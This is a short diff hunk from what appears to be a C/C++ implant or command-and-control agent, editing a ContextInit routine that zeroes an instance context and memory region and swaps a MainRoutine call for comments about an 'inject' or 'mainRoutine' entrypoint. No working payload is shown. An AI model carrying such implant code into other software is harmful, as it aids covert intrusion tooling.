@@ -36,5 +36,7 @@ VOID ContextInit () {
     x_memset(&Instance, 0, sizeof(HEXANE_CTX));
     x_memset(C_PTR(U_PTR(MmAddr) + sizeof(LPVOID)), 0, 0xE);
 
-    Core::MainRoutine();
+    // either call "inject" or "mainRoutine"
+    // call it "Entrypoint"
+    // Entrypoint();
 }
